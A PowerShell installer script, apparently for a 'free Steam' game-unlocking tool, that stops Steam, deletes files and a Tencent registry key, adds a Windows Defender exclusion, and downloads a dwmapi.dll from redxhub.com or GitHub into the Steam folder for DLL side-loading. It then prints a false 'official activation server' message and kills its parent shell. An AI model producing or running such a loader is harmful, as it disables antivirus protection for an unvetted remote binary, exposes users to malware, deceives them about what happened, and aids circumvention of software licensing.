cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'

$steamPath = ""

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

Write-Host "[*] Stopping Steam process..." -ForegroundColor Cyan
ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
} else {
    Write-Host "[+] Steam process stopped successfully." -ForegroundColor Green
}

Write-Host "[*] Detecting Steam installation path..." -ForegroundColor Cyan
if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}
if ([string]::IsNullOrWhiteSpace($steamPath)) {
    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

if (-not (Test-Path $steamPath -PathType Container)) {
    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}
Write-Host "[+] Steam found at: $steamPath" -ForegroundColor Green

$steamConfigPath = Join-Path $steamPath "config"
$hidPath = Join-Path $steamPath "xinput1_4.dll"
Write-Host "[*] Removing existing xinput1_4.dll..." -ForegroundColor Cyan
Remove-ItemIfExists $hidPath

$hidPath = Join-Path $steamPath "dwmapi.dll"
Write-Host "[*] Removing existing dwmapi.dll..." -ForegroundColor Cyan
Remove-ItemIfExists $hidPath

$xinputPath = Join-Path $steamPath "user32.dll"
Write-Host "[*] Removing existing user32.dll..." -ForegroundColor Cyan
Remove-ItemIfExists $xinputPath

$packageInfoPath = Join-Path $steamPath "appcache\packageinfo.vdf"
Write-Host "[*] Removing packageinfo.vdf..." -ForegroundColor Cyan
Remove-ItemIfExists $packageInfoPath


function PwStart() {
    try {
        if (!$steamPath) {
            return
        }
        if (!(Test-Path $localPath)) {
            Write-Host "[*] Creating local Steam directory..." -ForegroundColor Cyan
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Local Steam directory created." -ForegroundColor Green
        }

        $steamCfgPath = Join-Path $steamPath "steam.cfg"
        Write-Host "[*] Removing steam.cfg..." -ForegroundColor Cyan
        Remove-ItemIfExists $steamCfgPath

        $steamBetaPath = Join-Path $steamPath "package\beta"
        Write-Host "[*] Removing beta package..." -ForegroundColor Cyan
        Remove-ItemIfExists $steamBetaPath

        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
        Write-Host "[*] Removing Tencent cache..." -ForegroundColor Cyan
        Remove-ItemIfExists $catchPath

        $tencentRegPath = 'HKCU:\Software\Tencent'
        Write-Host "[*] Removing Tencent registry key..." -ForegroundColor Cyan
        if (Test-Path $tencentRegPath) {
            Remove-Item -Path $tencentRegPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}

        $versionDllPath = Join-Path $steamPath "version.dll"
        Write-Host "[*] Removing version.dll..." -ForegroundColor Cyan
        Remove-ItemIfExists $versionDllPath

        $haveXinput = $false

        $xinputUrls = @(
            "https://redxhub.com/raw/dwmapi.dll",
            "https://github.com/Scriptez1/RedXFreeSteamInstaller/raw/refs/heads/main/dwmapi.dll"
        )

        foreach ($url in $xinputUrls) {
            if ($haveXinput) { break }

            Write-Host "[*] Downloading dwmapi.dll..." -ForegroundColor Cyan
            
            try {
                Invoke-RestMethod -Uri $url -OutFile $hidPath -ErrorAction Stop
                Write-Host "[+] dwmapi.dll downloaded successfully." -ForegroundColor Green
                $haveXinput = $true
            } 
            catch {
                Write-Host "[!] First attempt failed. Retrying dwmapi.dll download..." -ForegroundColor Yellow
                
                if (Test-Path $hidPath) {
                    Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
                }
                
                Invoke-RestMethod -Uri $url -OutFile $hidPath -ErrorAction SilentlyContinue
                
                if (Test-Path $hidPath) {
                    Write-Host "[+] dwmapi.dll downloaded on retry." -ForegroundColor Green
                    $haveXinput = $true
                } else {
                    Write-Host "[-] Failed to download from this source." -ForegroundColor Red
                }
            }
        }

        if (-not $haveXinput) {
            Write-Host "[ERROR] Could not download dwmapi.dll from any source." -ForegroundColor Red
        }
        
        # $haveVersion = $false
        # $verPath = Join-Path $steamPath "version.dll"

        # $downloadUrls = @(
        #     "https://redxhub.com/raw/version.dll",
        #     "https://github.com/Scriptez1/RedXFreeSteamInstaller/raw/refs/heads/main/version.dll"
        # )

        # foreach ($url in $downloadUrls) {
        #     if ($haveVersion) { break }
        #     try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}

        #     Write-Host "[*] Downloading version.dll from alternative source..." -ForegroundColor Cyan
            
        #     try {
        #         Invoke-RestMethod -Uri $url -OutFile $verPath -ErrorAction Stop
        #         Write-Host "[+] version.dll downloaded successfully." -ForegroundColor Green
        #         $haveVersion = $true
        #     } 
        #     catch {
        #         Write-Host "[!] First attempt failed. Retrying version.dll download..." -ForegroundColor Yellow
                
        #         if (Test-Path $verPath) {
        #             Move-Item -Path $verPath -Destination "$verPath.old" -Force -ErrorAction SilentlyContinue
        #         }
                
        #         Invoke-RestMethod -Uri $url -OutFile $verPath -ErrorAction SilentlyContinue
                
        #         if (Test-Path $verPath) {
        #             Write-Host "[+] version.dll downloaded on retry." -ForegroundColor Green
        #             $haveVersion = $true
        #         } else {
        #             Write-Host "[-] Failed to download from this source." -ForegroundColor Red
        #         }
        #     }
        # }

        # if (-not $haveVersion) {
        #     Write-Host "[ERROR] Could not download version.dll from any source." -ForegroundColor Red
        # }

        $steamExePath = Join-Path $steamPath "steam.exe"

        Write-Host "[*] Launching Steam..." -ForegroundColor Cyan
        Start-Process $steamExePath
        Start-Process "steam://"
        Write-Host "[+] Steam launched successfully." -ForegroundColor Green
        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
            Start-Sleep -Seconds 1
        }

        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }

        exit

    } catch {
        Write-Host "[-] Unexpected error: $_" -ForegroundColor Red
        Start-Sleep 10
    }
}

PwStart
